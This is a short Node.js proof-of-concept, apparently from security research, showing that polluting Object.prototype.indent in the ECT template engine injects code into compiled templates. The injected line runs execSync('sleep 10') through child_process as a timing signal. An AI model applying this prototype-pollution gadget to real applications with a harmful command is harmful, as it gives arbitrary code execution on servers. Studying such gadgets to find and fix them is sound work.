var ECT = require('ect');

try{
    Object._expose.setupSymbols()
}
catch(e){
    console.log("[!] symbolic execution not enabled")
}

Object.prototype.indent = "process.mainModule.require('child_process').execSync('sleep 10')\n//";

var renderer = ECT({ root : {
				layout: '<html><head><title><%- @title %></title></head><body><% content %></body></html>',
				page: '<% extend "layout" %><p>Page content</p>'
				}
			});

var html = renderer.render('page', { title: 'Hello, World!' });

// console.log(html);